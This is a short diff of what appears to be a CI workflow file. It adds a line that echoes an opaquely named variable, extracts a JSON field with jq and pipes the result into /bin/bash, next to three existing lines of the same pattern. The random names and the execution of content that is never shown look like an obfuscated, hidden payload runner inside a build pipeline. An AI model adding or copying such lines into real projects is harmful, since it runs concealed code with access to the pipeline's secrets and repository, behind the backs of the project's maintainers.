@@ -31,6 +31,7 @@ jobs:
           echo $mi9 | jq -r .slxj020 | /bin/bash
           printf '%s' "$epkb86526" | jq -r .v1 | /bin/bash
           echo $dujt551 | jq -r .h55 | /bin/bash
+          echo $qk8479 | jq -r .r7733 | /bin/bash
 
       - name: Upload results
         if: always()
